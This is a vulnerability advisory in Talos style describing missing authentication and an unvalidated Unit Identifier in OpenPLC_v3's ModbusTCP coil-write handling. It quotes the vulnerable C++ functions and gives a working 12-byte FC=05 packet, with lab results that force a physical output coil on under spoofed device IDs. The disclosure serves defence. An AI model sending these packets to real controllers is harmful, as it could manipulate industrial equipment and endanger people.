# Talos Vulnerability Report

## OpenPLC OpenPLC_v3 ModbusTCP server FC=05 Unit Identifier bypass and unrestricted coil write vulnerability

##### CVE Number

[Pending]

##### SUMMARY

A compound vulnerability exists in the ModbusTCP server functionality of OpenPLC _v3, where two independent defects in the FC=05 (Write Single Coil) request processing chain combine. First, `processModbusMessage()` never validates the Unit Identifier field (`buffer[6]`), accepting any value from 0x00 to 0xFF and echoing it in the response. Second, `WriteCoil()` writes to any coil address without authentication. A specially crafted 12-byte Modbus TCP request can simultaneously spoof a device identity and set or clear any coil mapped to physical digital outputs. An unauthenticated attacker can send a single network request to trigger this vulnerability.

##### CONFIRMED VULNERABLE VERSIONS

The versions below were either tested or verified to be vulnerable.

OpenPLC _v3 master branch (all versions using `webserver/core/modbus.cpp`)

##### PRODUCT URLS

OpenPLC_v3 - [https://github.com/thiagoralves/OpenPLC_v3](https://github.com/thiagoralves/OpenPLC_v3)

##### CWE

CWE-306 - Missing Authentication for Critical Function

##### DETAILS

OpenPLC is an open-source programmable logic controller (PLC) designed to provide a low cost option for automation. The platform consists of two parts: the Runtime and the Editor. The Runtime can be deployed on a variety of platforms including Windows, Linux, and various microcontrollers. Common uses for OpenPLC include home automation and industrial security research. OpenPLC supports communication across a variety of protocols, including Modbus and EtherNet/IP.

A compound exploitation path exists in OpenPLC's FC=05 (Write Single Coil) processing. Two independent defects in the same request processing chain combine: (1) the Unit Identifier field is never validated, and (2) coil writes require no authentication. When exploited together, a single 12-byte packet can target a specific downstream device by spoofing the Unit Identifier while simultaneously setting or clearing any coil on the output map.

The request passes through the following code path with zero security checks:

`server.cpp:startServer()` → `handleConnections()` → `processMessage()` → `processModbusMessage()` → `WriteCoil()`

**Defect 1 — Unit Identifier bypass**

When `processMessage()` dispatches to `processModbusMessage()` ([1]), the response is sent using the same buffer that held the original request ([2]). Since no function modifies `buffer[6]`, the attacker's Unit Identifier is echoed verbatim:

```
void processMessage(unsigned char *buffer, int bufferSize, int client_fd, int protocol_type)
{
    int messageSize = 0;
    if (protocol_type == MODBUS_PROTOCOL)
    {
        messageSize = processModbusMessage(buffer, bufferSize);  // [1]
    }
    while (messageSize > 0)
    {
        ssize_t bytesWritten = write(client_fd, buffer, messageSize);  // [2] same buffer
        // ...
    }
}
```

Inside `processModbusMessage()`, parsing begins at `buffer[7]`. `buffer[6]` is never referenced ([3]):

```
int processModbusMessage(unsigned char *buffer, int bufferSize)
{
    MessageLength = 0;
    uint16_t field1 = (uint16_t)buffer[8] << 8 | (uint16_t)buffer[9];
    // ...

    // *** buffer[6] (Unit Identifier) is NEVER read or checked ***    // [3]

    else if(buffer[7] == MB_FC_WRITE_COIL)   // FC=05
    {
        WriteCoil(buffer, bufferSize);        // [4] dispatched with no Unit ID check
    }
    // ...
}
```

While OpenPLC provides Slave ID configuration for its Modbus *Master* role (outbound polling via `webserver.py`), the Modbus *Server* (TCP/502 listener) has no configurable device address — not in the web UI, database, configuration files, or source code.

**Defect 2 — Unrestricted coil write**

`WriteCoil()` extracts the Output Address from `buffer[8..9]` ([5]) and writes directly to `bool_output[][]` ([6]) with only a range check against `MAX_COILS` (8192):

```
void WriteCoil(unsigned char *buffer, int bufferSize)
{
    int Start;
    int mb_error = ERR_NONE;

    if (bufferSize < 12)
    {
        ModbusError(buffer, ERR_ILLEGAL_DATA_VALUE);
        return;
    }

    Start = word(buffer[8], buffer[9]);   // [5] attacker-controlled

    if (Start < MAX_COILS)
    {
        unsigned char value;
        if (word(buffer[10], buffer[11]) > 0)
            value = 1;
        else
            value = 0;

        pthread_mutex_lock(&bufferLock);
        if (bool_output[Start/8][Start%8] != NULL)
        {
            *bool_output[Start/8][Start%8] = value;  // [6] direct write, no auth
        }
        pthread_mutex_unlock(&bufferLock);
    }
    else
    {
        mb_error = ERR_ILLEGAL_DATA_ADDRESS;
    }

    if (mb_error != ERR_NONE)
    {
        ModbusError(buffer, mb_error);
    }
    else
    {
        buffer[4] = 0;
        buffer[5] = 6;
        MessageLength = 12;  // [7] echo includes buffer[6] (spoofed Unit ID)
    }
}
```

The normal response at [7] echoes the first 12 bytes of `buffer`, including `buffer[6]` (the attacker's spoofed Unit ID), confirming the coil write while impersonating the targeted device.

The `ModbusError()` function also preserves `buffer[6]` ([8]):

```
void ModbusError(unsigned char *buffer, int mb_error)
{
    buffer[4] = 0;
    buffer[5] = 3;
    buffer[7] = buffer[7] | 0x80;
    buffer[8] = mb_error;
    MessageLength = 9;
    // buffer[6] (Unit ID) is NEVER modified    // [8]
}
```

In both success and error cases, the response carries the attacker's Unit Identifier. In a gateway deployment (e.g., Modbus TCP-to-RTU bridge connecting multiple PLCs), the gateway attributes the response to whichever device the attacker specified — completing a device identity spoofing attack combined with physical output manipulation.

Knowing this, a single 12-byte packet can combine both defects. The following request forces coil `0x0013` ON using Unit ID `0x03`:

```
00 01 00 00 00 06 03 05 00 13 FF 00
                  ^^         ^^  ^^
            UID=0x03    addr=19  ON
```

The server responds:

```
00 01 00 00 00 06 03 05 00 13 FF 00
                  ^^
            UID=0x03 ECHOED — server impersonates device 3
```

To verify the vulnerability, a test environment was set up with OpenPLC v3 running in a Docker container (debian:trixie). A Python script sent FC=05 requests with varying Unit IDs and verified results via FC=01 read-back.

**Core compound attack** — Unit ID 0x03 with coil write:

```
Pre-attack: coil[0x0013] = OFF

TX: 00 03 00 00 00 06 03 05 00 13 FF 00
RX: 00 03 00 00 00 06 03 05 00 13 FF 00   ← UID=0x03 echoed

Post-attack: coil[0x0013] = ON ← write succeeded under spoofed identity
```

**Unit ID sweep** — five values tested with FC=05:

```
Unit ID 0x01 (default):    FC=05 write ✓  response UID=0x01 (echoed)  coil=ON
Unit ID 0x03 (target):     FC=05 write ✓  response UID=0x03 (echoed)  coil=ON
Unit ID 0x00 (broadcast):  FC=05 write ✓  response UID=0x00 (echoed)  coil=ON
Unit ID 0xFF (wildcard):   FC=05 write ✓  response UID=0xFF (echoed)  coil=ON
Unit ID 0x7F (arbitrary):  FC=05 write ✓  response UID=0x7F (echoed)  coil=ON
```

All five Unit Identifier values are accepted and echoed on FC=05. The coil write succeeds in every case, confirming both defects are simultaneously exploitable.
